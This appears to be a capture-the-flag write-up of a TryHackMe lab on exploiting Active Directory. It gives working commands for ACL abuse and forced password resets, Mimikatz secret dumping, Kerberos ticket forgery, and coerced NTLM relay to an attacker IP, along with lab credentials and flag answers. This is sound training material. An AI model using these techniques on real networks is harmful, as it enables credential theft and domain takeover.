![image](https://github.com/user-attachments/assets/d9509ed9-4fa9-4285-bf27-51e33bdedb01)


# Exploiting Active Directory
  Learn common AD exploitation techniques that can allow you to reach your goal in an AD environment.

TryHackMe room [link](https://tryhackme.com/room/exploitingad)

<br>


## Task 1 : Introduction

  This task is part of an Active Directory (AD) exploitation lab, building on previous networks (Breaching AD and Enumerating AD). The goal is to exploit AD misconfigurations for lateral movement and privilege escalation.

> Workflow...

- Network Setup:
    
    - The network includes hosts like THYCHILDC (10.200.47.101) and THYSERVER1 (10.200.47.201).
    - DNS must be configured to resolve .loc domains (e.g., thmdc.za.tryhackme.loc).
    - You need to download the `.ovpn` for this AD exploitaion.. (can be downloaded from access page.)

      ![image](https://github.com/user-attachments/assets/a420a27f-f87f-4cb6-bec0-96142c4db17d)


    - AttackBox users automatically connect but must set DNS manually.
    - Other hosts (OpenVPN/Kali) require manual DNS setup.
      ![image](https://github.com/user-attachments/assets/d8157595-d5ce-4382-a099-3ef4fe233db8)
       - Configure DNS.
   
              sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
        ![image](https://github.com/user-attachments/assets/265edb61-a539-4340-a5b3-b3e99177c906)
 
       - Simillarly, Added the Domain controller IP in the `/etc/resolv.conf`
                   
              nameserver $THMDCIP
         
        ![image](https://github.com/user-attachments/assets/d40a459e-232c-4c98-8276-74b54213ebdc)
  
       - Test DNS.  

              nslookup thmdc.za.tryhackme.loc

        ![image](https://github.com/user-attachments/assets/4bf5e879-9827-4fc9-8ca4-efa3952af048)

- Initial Access:
    
    - Credentials are obtained from the follwoing web-page..

            http://distributor.za.tryhackme.loc/creds

      ![image](https://github.com/user-attachments/assets/0f467fcb-2366-4c67-a60b-f17d04818f1c)

    - These credentials allow `RDP`/`SSH` access to `THMWRK1.za.tryhackme.loc` (jump host).

          ssh za.tryhackme.loc\\paula.bailey@thmwrk1.za.tryhackme.loc

      ![image](https://github.com/user-attachments/assets/559b1080-4c9c-4dc3-9be9-39598eb5a3a9)

      and for the rdp..

          xfreerdp3 /v:thmjmp1.za.tryhackme.com /u:paula.bailey /p:Y2VgRWWiQ /cert:ignore
       
- Exploitation Techniques Covered:

    - AD Delegation
    - Forcing Authentication Relays
    - Group Policy Objects (GPOs)
    - Targeting AD Users
    - Domain Trusts
    - Silver/Golden Tickets
      
- Post exploitation:
    
    - Perform lateral movement and privilege escalation.
    - Later tasks will cover persistence
      ![image](https://github.com/user-attachments/assets/956a81fb-affb-4677-92ed-07354be34f88)


<br>



## Task 2: Exploiting Permission Delegation

- This task demonstrates how Active Directory (AD) Permission Delegation can be exploited to escalate privileges. The key steps involve:
  - Identifying Misconfigured ACEs (Access Control Entries) that grant excessive permissions (e.g., `AddMembers`, `ForceChangePassword`).
  - Using `BloodHound` to analyze attack paths (e.g., from a low-privileged user to `Tier 2 Admins`).
  - Exploiting Weak Delegation by:
    - Adding our account to the IT Support group (using `Add-ADGroupMember`).
    - Forcing a password reset on a Tier 2 Admin (using `Set-ADAccountPassword`).
  - Gaining `Administrative` Access to `THMWRK1`.
 


> Workflow....

### 1: Access BloodHound
  -  Start Neo4j:

         neo4j console start

     ![image](https://github.com/user-attachments/assets/763d8802-4f15-4d74-8e44-9903c0a889aa)

  - Open BloodHound in another terminal:

        bloodhound --no-sandbox

    ![image](https://github.com/user-attachments/assets/181c2d5a-7222-4bad-863b-521e4de854d4)

  - Log in with default credentials: `admin`:`admin` for bloodhound and `neo4j`:`neo4j` for database.

  ![image](https://github.com/user-attachments/assets/f92bb430-b208-4e7b-882f-238287971a7d)

  - I copied the file to my attack box..
  
  ![image](https://github.com/user-attachments/assets/742a58b4-f2ec-4663-aef2-946dd59f1f25)

  - Import the provided `SharpHound` data (ZIP file) by dragging it into BloodHound.
  ![image](https://github.com/user-attachments/assets/fe4156e2-c996-4897-b998-eaa83c1b0afc)

### 2: Identify Attack Path
  
  - Search for your assigned `AD` user
  - Set `start` position: Your user.
  - Set `end` position: Tier 2 Admins group.
  - BloodHound reveals:
    - Domain Users can add members to IT Support (AddMembers ACE).
    - IT Support can reset passwords for Tier 2 Admins (ForceChangePassword ACE).

### 3: Exploit Misconfigured ACEs
 - Add Your Account to IT Support (via PowerShell on THMWRK1):

        Add-ADGroupMember "IT Support" -Members "Your.AD.Username"
   
    - Verify with:
  
          Get-ADGroupMember -Identity "IT Support"
    ![image](https://github.com/user-attachments/assets/328bf7be-175b-454b-afbe-3e18ecf49cf2)

  - Force Password Reset for a Tier 2 Admin:
    - List Tier 2 Admins:
  
          Get-ADGroupMember -Identity "Tier 2 Admins"

     ![image](https://github.com/user-attachments/assets/448e674d-447f-47a8-bc20-829ac3384119)
      
    - Reset password (replace `Target.Admin` with a chosen account):
  
          $Password = ConvertTo-SecureString "Hack123!" -AsPlainText -Force
          Set-ADAccountPassword -Identity "t2_leon.francis" -Reset -NewPassword $Password
      
     - Wait 5-10 mins for propagation (or run `gpupdate /force`).
  
    ![image](https://github.com/user-attachments/assets/ff965fec-0781-4a94-b3a9-d6334e1d2131)

### 4: Retrieve the Flag

- RDP/SSH into `THMWRK1` using the compromised Tier 2 Admin credentials.
    
          ssh za.tryhackme.loc\\t2_leon.francis@thmwrk1.za.tryhackme.loc

  Use the password we set earlier. i.e. **Hack123!**
  
  ![image](https://github.com/user-attachments/assets/ecd9afc5-86cf-4a7c-b82a-500ba98f1a4a)

- Navigate to the Administrator’s Desktop and open `flag1.txt`.

  ![image](https://github.com/user-attachments/assets/724f846b-36cf-4538-aa8b-f17209652d16)


<br>

## _Answer_

Which ACE would allow you to update any non-protected parameter of a target object?

      GenericWrite

What is the value of the flag stored on the Desktop of the Administrator user on `THMWRK1` (`flag1.txt`)?

      THM{Permission.Delegation.FTW!} 
  

<br>

## Task 3: Exploiting Kerberos Delegation

  This task focuses on exploiting Kerberos Delegation in `Active Directory` (AD), specifically Constrained Delegation, to escalate privileges and gain access to `THMSERVER1`.

> Summary..

- Kerberos Delegation Types:
    
    - **Unconstrained Delegation:** Allows delegation to any service (least secure).
    - **Constrained Delegation:** Restricts delegation to specific services (e.g., `HTTP`, `WSMAN`).
    - **Resource-Based Constrained Delegation (RBCD):** The service defines which accounts can delegate to it.
      
- Exploitation Steps:
    
    - Enumerate accounts with Constrained Delegation (`Get-NetUser -TrustedToAuth`).
    - Dump `LSASecrets` (using `Mimikatz`) to retrieve the `svcIIS` password.
    - Forge `TGT/TGS` tickets (using `Kekeo`) to impersonate a Tier 1 Admin (`t1_trevor.jones`).
    - Use the forged tickets to gain PowerShell Remoting (`WinRM`) access to `THMSERVER1`.



> Workflow...

### 1: Enumerate Delegation Misconfigurations

- Log in to THMWRK1 with your `Tier 2` Admin credentials.
- Use `PowerView` to find accounts with Constrained Delegation:

      Import-Module C:\Tools\PowerView.ps1
      Get-NetUser -TrustedToAuth
  
    - Output: svcIIS can delegate HTTP and WSMAN on THMSERVER1.
  
  ![image](https://github.com/user-attachments/assets/616aec04-40b2-4d7c-8e67-2cf24c0e3ca6)

### 2: Extract Credentials (LSASecrets)
- Run `Mimikatz` to dump secrets:

      C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  ![image](https://github.com/user-attachments/assets/45952161-9ed4-46b9-9eaf-bc39de133b83)

- Elevate to `SYSTEM`:
  
      token::elevate
  ![image](https://github.com/user-attachments/assets/4f6a6dc2-bbe5-4eb8-b6d4-9f7e054d54d7)

- Dump secrets:

      lsadump::secrets
  
   - Note the NTLM hash or plaintext password for svcIIS.
  
  ![image](https://github.com/user-attachments/assets/65f0fbaa-62c8-4333-bc13-8c0237460d9e)


### 3: Forge Kerberos Tickets (Kekeo + Mimikatz)
- Generate a TGT for `svcIIS` (using Kekeo):

      C:\Tools\kekeo\x64\kekeo.exe
      tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:PASSWORD

    - Saves TGT_svcIIS@ZA.TRYHACKME.LOC.kirbi.
    ![image](https://github.com/user-attachments/assets/81be77b2-d718-4b3a-b1d6-64999b616755)

- Forge TGS tickets for `HTTP` and `WSMAN` (impersonating `t1_trevor.jones`):

  For Http.

      tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

  ![image](https://github.com/user-attachments/assets/6c058277-3117-4211-b9d0-a15c351cc337)

  After this we will move to `WSMAN`
  
      tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc

  ![image](https://github.com/user-attachments/assets/48e9004d-a06d-4863-9cb1-8ab52210c52b)

    - Saves `TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi` and `TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`.

- Load tickets into memory (`Mimikatz`):

      kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
      kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

  ![image](https://github.com/user-attachments/assets/8145f571-daeb-4d3d-bcfb-a43f5df4c466)

### 4: Gain Access to THMSERVER1
- Start a `PowerShell` session:

      New-PSSession -ComputerName thmserver1.za.tryhackme.loc
      Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
  
   - Verify with whoami (should show `za\t1_trevor.jones`).

    ![image](https://github.com/user-attachments/assets/3482dacd-2dd7-4b49-be30-7800d5f2dbc6)

- Navigate to the Administrator’s Desktop and read `flag2.txt`:

      cd C:\Users\Administrator\Desktop
      type flag2.txt

  ![image](https://github.com/user-attachments/assets/77b35a4d-53f5-4720-935a-b4b09fb57c43)

      THM{Constrained.Delegation.Can.Be.Very.Bad}


<br>

## _Answer_

Which Kerberos Delegation type allows for delegation of all services?

      Unconstrained Delegation

Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

    Resource-Based Constrained Delegation

Which Constrained Delegation service allows access to the file system of the system via delegation?

    CIFS

What is the value of the flag stored in the Desktop directory of the Administrator user on `THMSERVER1` (`flag2.txt`)?

    THM{Constrained.Delegation.Can.Be.Very.Bad}
  

<br>





## Task 4: Exploiting Authentication Relays

  
  This task demonstrates how to force and relay machine account authentication (via the `Printer Bug`) to gain administrative access to `THMSERVER1`.

> Summary..

- Machine Accounts:

    - Every Windows host has a machine account with a complex, auto-rotated password (every `30 days` by default).
    - Some machine accounts have admin privileges over others (e.g., `THMSERVER2$` can admin `THMSERVER1`).
      
- Printer Bug (`MS-RPRN`):
    
    - A "feature" that lets any domain user force a target machine (with the Print Spooler service running) to authenticate to an attacker-controlled IP.
    - Requirements:
        
        - Valid AD credentials.
        - Print Spooler running on the target (`THMSERVER2`).
        - SMB signing not enforced (only "enabled but not required").
          
- Exploitation Steps:
    
    - Use `BloodHound` or a custom Cypher query to find machine accounts with `AdminTo` privileges.
    - Coerce `THMSERVER2` to authenticate to your attacker machine using SpoolSample.
    - Relay the authentication to `THMSERVER1` using Impacket’s `ntlmrelayx.py`.
    - Dump hashes or execute commands as `SYSTEM` on `THMSERVER1`.

</pre>


> Workflow...

### 1: Verify Machine Account Privileges

- BloodHound Custom Query:
  - Run this Cypher query to find machines with `AdminTo` relationships:


        MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p

  ![image](https://github.com/user-attachments/assets/9d07122a-b865-45f5-b969-a1cfa8479d37)

    Result: `THMSERVER2$` has admin rights over `THMSERVER1`.
  
![image](https://github.com/user-attachments/assets/e196fc33-b104-4b0e-bab5-31e73c6e3851)

### 2: Check Exploit Prerequisites
- Print Spooler Service:

  - Verify it’s running on `THMSERVER2`:

        GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc

  ![image](https://github.com/user-attachments/assets/e8ddc3d4-6ebe-4135-8cd0-8ec6bfc7fc99)


- SMB Signing:

  - Confirm it’s not enforced on `THMSERVER1` and `THMSERVER2`:


        nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
    

    **Output** should show: `Message signing enabled but not required`.
    
![image](https://github.com/user-attachments/assets/9735b1df-b179-4364-b1f4-81fcebfca580)


### 3: Exploit Authentication Relay
- Set Up NTLM Relay (AttackBox):

  - Run `ntlmrelayx.py` to relay SMB auth to `THMSERVER1`:

        python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://<THMSERVER1_IP> -debug

  ![image](https://github.com/user-attachments/assets/823b8293-6367-41b7-9a46-3f1d9108f7d5)
      in my case THMSERVER1_IP is `10.200.47.201`

- Trigger Coerced Authentication (`THMWRK1`):

  - Force `THMSERVER2` to authenticate to your AttackBox IP:

          C:\Tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc <ATTACKER_IP>
    
- Gain Access:

    - If successful, `ntlmrelayx` will dump hashes or execute commands on `THMSERVER1`.
    
    - For a shell, use:

          python3.9 ntlmrelayx.py -smb2support -t smb://<THMSERVER1_IP> -c 'whoami /all'
      
### Retrieve the Flag

- Access `THMSERVER1`:

    - Use dumped credentials or a relayed shell to log in.

- Navigate to Administrator’s Desktop:

        cd C:\Users\Administrator.ZA\Desktop
        type flag3.txt
